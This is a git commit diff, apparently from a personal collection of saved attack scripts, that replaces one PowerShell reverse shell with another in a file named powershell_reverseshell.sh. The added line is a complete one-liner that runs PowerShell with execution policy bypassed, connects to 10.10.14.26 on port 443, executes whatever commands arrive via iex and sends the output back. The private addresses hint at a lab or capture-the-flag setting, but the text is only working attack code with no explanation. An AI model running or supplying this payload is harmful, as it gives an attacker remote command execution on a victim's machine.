f057fb331f5da8a21bf7832a7cb863c343035bf7
w-evans <wle831@gmail.com>
2021-04-03 14:27:00 -0700

    clean

--- saved_scripts/powershell_reverseshell.sh
+++ saved_scripts/powershell_reverseshell.sh
@@ -1,7 +1,1 @@
-$client = New-Object System.Net.Sockets.TCPClient("10.10.0.15",443);$stream =
-$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =
-$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName
-System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 |
-Out-String );$sendback2 = $sendback + "# ";$sendbyte =
-([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyt
-e.Length);$stream.Flush()};$client.Close()
+powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.26',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
